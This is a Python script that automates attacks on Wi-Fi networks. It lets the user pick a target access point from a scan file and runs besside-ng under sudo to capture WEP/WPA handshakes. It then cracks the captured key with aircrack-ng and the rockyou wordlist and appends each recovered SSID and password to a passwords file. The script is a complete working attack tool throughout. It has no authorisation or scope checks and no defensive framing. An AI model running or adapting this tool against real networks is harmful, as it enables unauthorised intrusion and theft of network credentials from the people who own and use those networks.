import subprocess, signal, sys, time, os, shutil, csv, glob, time, threading, re

def target_ap():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            all_aps = []
            for row in csv_reader:
                # Add every access point to the list, not just those with WPA2 encryption
                all_aps.append(row)

            if all_aps:
                print("Select an Access Point by its index number:")
                for index, ap in enumerate(all_aps):
                    print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")

                selected_index = int(input("Enter the index number of the target AP: "))
                if 0 <= selected_index < len(all_aps):
                    selected_ap = all_aps[selected_index]
                    return selected_ap[2], selected_ap[0]  # Returning SSID and BSSID
                else:
                    print("Invalid index selected.")
                    return None, None
            else:
                print("No access points found.")
                return None, None

    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
        return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None

def main(ap_mac, interface):
    besside_ng(ap_mac, interface)

def besside_ng(ap_mac, interface):
    def sigint_handler(signum, frame):
        print("Ctrl+C was pressed during besside-ng execution. Cleaning up and exiting...")
        delete_file("/mnt/data/wpacracking/wpa.cap")
        delete_file("/mnt/data/wpacracking/wep.cap")

    # Set the signal handler only during the execution of this function
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, sigint_handler)

    try:
        print("Running besside-ng, please wait...")
        cmd = ["sudo", "besside-ng", "-b", ap_mac, interface]
        subprocess.run(cmd)
    except Exception as e:
        print(f"An error occurred during besside-ng execution: {e}")
    finally:
        # Reset the signal handler to the original one after finishing
        signal.signal(signal.SIGINT, original_handler)
        cleanup()

def cleanup():
    # Moving .cap files to wpacracking directory and deleting besside.log
    move_files()
    delete_file("./besside.log")

def move_files():
    dest_dir = "/mnt/data/wpacracking"
    if not os.path.exists(dest_dir):
        os.makedirs(dest_dir)

    for cap_file in ["./wep.cap", "./wpa.cap"]:
        src = cap_file
        dest = os.path.join(dest_dir, os.path.basename(cap_file))
        if os.path.exists(src):
            os.rename(src, dest)
        else:
            print(f"{cap_file} not found.")

def delete_file(filepath):
    if os.path.exists(filepath):
        os.remove(filepath)
    else:
        print(f"{filepath} not found. Unable to delete.")

def crack(ssid):
    cap_file_path = "/mnt/data/wpacracking/wpa.cap"
    log_file_path = "/mnt/data/wpacracking/aircrack.log"
    if not os.path.exists(cap_file_path):
        print("wpa.cap not found, cannot proceed with cracking.")
        return

    # Setup the command to log output to a file
    with open(log_file_path, 'w') as log_file:
        cmd = ["sudo", "aircrack-ng", cap_file_path, "-w", "/usr/share/wordlists/rockyou.txt"]
        try:
            print("Running aircrack-ng, please wait...")
            # Direct output to both stdout and log_file
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
                    log_file.write(output)
            process.poll()
        except Exception as e:
            print(f"An error occurred during aircrack-ng execution: {e}")
        finally:
            # Delete cap files after attempting to crack
            delete_file("/mnt/data/wpacracking/wpa.cap")
            delete_file("/mnt/data/wpacracking/wep.cap")

    # Search for the password in the log file and write it to passwords.txt if found
    extract_password(ssid, log_file_path)

def extract_password(ssid, log_file_path):
    password_file_path = "/mnt/data/passwords.txt"
    password = None
    try:
        with open(log_file_path, 'r') as file:
            contents = file.read()
            # Regex to find the password
            match = re.search(r'KEY FOUND! \[ (.+?) \]', contents)
            if match:
                password = match.group(1)
                print(f"Password found: {password}")
                # Write to passwords file
                with open(password_file_path, 'a') as pwd_file:
                    pwd_file.write(f"{ssid},{password}\n")
            else:
                print("No password found in the log.")
    except FileNotFoundError:
        print(f"Log file {log_file_path} not found.")
    except Exception as e:
        print(f"An error occurred while extracting the password: {e}")
